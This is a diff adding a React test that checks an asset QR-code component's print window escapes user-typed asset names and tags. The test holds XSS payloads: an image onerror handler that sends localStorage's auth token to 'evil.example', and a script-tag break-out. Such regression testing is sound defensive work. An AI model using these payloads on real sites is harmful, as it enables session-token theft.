@@ -1,5 +1,6 @@
 import { beforeEach, describe, expect, it, vi } from 'vitest'
 import { render, screen, waitFor } from '@testing-library/react'
+import userEvent from '@testing-library/user-event'
 import QRCode from 'qrcode'
 import { AssetQRCode } from '../AssetQRCode'
 
@@ -24,5 +25,30 @@ describe('AssetQRCode', () => {
     await waitFor(() => expect(QRCode.toCanvas).toHaveBeenCalled())
     expect(vi.mocked(QRCode.toCanvas).mock.calls[0][1]).toBe(`${window.location.origin}/assets/7`)
     expect(screen.getByText('Scan to view asset')).toBeInTheDocument()
+  })
+
+  describe('the print window', () => {
+    // The window is written as a string of HTML, which React does not escape: an asset's name is typed by a person.
+    it('shows an asset name as text, never as markup that would run in the app\'s own address', async () => {
+      const written: string[] = []
+      vi.spyOn(HTMLCanvasElement.prototype, 'toDataURL').mockReturnValue('data:image/png;base64,AAAA')
+      vi.spyOn(window, 'open').mockReturnValue({
+        document: { write: (html: string) => written.push(html), close: vi.fn() },
+        focus: vi.fn(),
+        print: vi.fn(),
+      } as unknown as Window)
+      const evil = `<img src=x onerror="fetch('//evil.example/'+localStorage.auth_token)">`
+
+      render(<AssetQRCode assetId={7} assetTag={`FF-7"><script>alert(1)</script>`} assetName={evil} publicCode="Ab3dEf" />)
+      await waitFor(() => expect(QRCode.toCanvas).toHaveBeenCalled())
+      await waitFor(() => expect(screen.getByRole('button', { name: /print/i })).toBeEnabled())
+      await userEvent.click(screen.getByRole('button', { name: /print/i }))
+
+      const html = written.join('')
+      expect(html).toContain('&lt;img src=x onerror=')
+      expect(html).not.toContain('<img src=x')
+      expect(html).not.toContain('<script>')
+      expect(html).toContain('FF-7&quot;&gt;&lt;script&gt;')
+    })
   })
 })
